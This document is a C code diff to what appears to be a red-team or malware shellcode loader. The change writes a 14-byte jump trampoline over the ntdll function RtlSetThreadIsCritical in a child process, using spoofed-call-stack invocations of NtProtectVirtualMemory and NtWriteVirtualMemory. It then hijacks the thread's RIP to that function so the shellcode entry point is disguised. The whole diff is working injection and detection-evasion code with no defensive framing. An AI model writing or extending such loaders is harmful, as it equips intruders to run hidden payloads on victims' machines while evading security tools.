@@ -196,18 +196,73 @@ void go()
         return;
     }
 
-    ctx->Rip = (DWORD64)shellcode;
+
+
+    
+    /* ── Build trampoline → shellcode ─────────────────────────────── */
+    /* jmp [rip+0] + shellcode_addr = 14 bytes */
+    u8 trampoline[14];
+    trampoline[0] = 0xFF;
+    trampoline[1] = 0x25;
+    trampoline[2] = 0x00;
+    trampoline[3] = 0x00;
+    trampoline[4] = 0x00;
+    trampoline[5] = 0x00;
+    *(u64*)(trampoline + 6) = (u64)shellcode;
+
+    /* ── Find target function in child (same base as parent) ───────── */
+    u64 target_fn = (u64)NTDLL$RtlSetThreadIsCritical;
+
+    /* ── Make target function writable in child ────────────────────── */
+    PVOID tramp_base = (PVOID)(target_fn & ~(4096 - 1));
+    // SIZE_T tramp_size = 14 + (target_fn - (u64)tramp_base);
+    SIZE_T tramp_size = 4096;
+
+    ULONG tramp_oldp = 0;
+
+    status = (NTSTATUS)spoof_call(
+        (u64)NTDLL$NtProtectVirtualMemory,
+        (u64)hProcess, (u64)&tramp_base,
+        (u64)&tramp_size, (u64)PAGE_EXECUTE_READWRITE, (u64)&tramp_oldp,
+        0, 0, 0, 0, 0, 0);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtProtectVirtualMemory (trampoline): 0x%X\n", status);
+        return;
+    }
+
+    /* ── Write trampoline into child ───────────────────────────────── */
+    SIZE_T written = 0;
+    status = (NTSTATUS)spoof_call(
+        (u64)NTDLL$NtWriteVirtualMemory,
+        (u64)hProcess, (u64)target_fn,
+        (u64)trampoline, (u64)14, (u64)&written,
+        0, 0, 0, 0, 0, 0);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtWriteVirtualMemory: 0x%X\n", status);
+        return;
+    }
+
+    /* ── Restore protection ─────────────────────────────────────────── */
+    status = (NTSTATUS)spoof_call(
+        (u64)NTDLL$NtProtectVirtualMemory,
+        (u64)hProcess, (u64)&tramp_base,
+        (u64)&tramp_size, (u64)tramp_oldp,
+        (u64)&tramp_oldp,
+        0, 0, 0, 0, 0, 0);
+
+    /* ── Set RIP to trampoline target (not shellcode directly) ─────── */
+    ctx->Rip = target_fn;
 
     status = (NTSTATUS)spoof_call(
         (u64)NTDLL$NtSetContextThread,
         (u64)hThread, (u64)ctx,
         0, 0, 0, 0, 0, 0, 0, 0, 0);
-    if (!NT_SUCCESS(status))
-    {
+    if (!NT_SUCCESS(status)) {
         dprintf("[-] NtSetContextThread: 0x%X\n", status);
         return;
     }
 
-    dprintf("[+] RIP hijacked → shellcode executing\n");
+    dprintf("[+] RIP → trampoline → shellcode\n");
     dprintf("[+] === EXIT LOADER ===\n");
+
 }
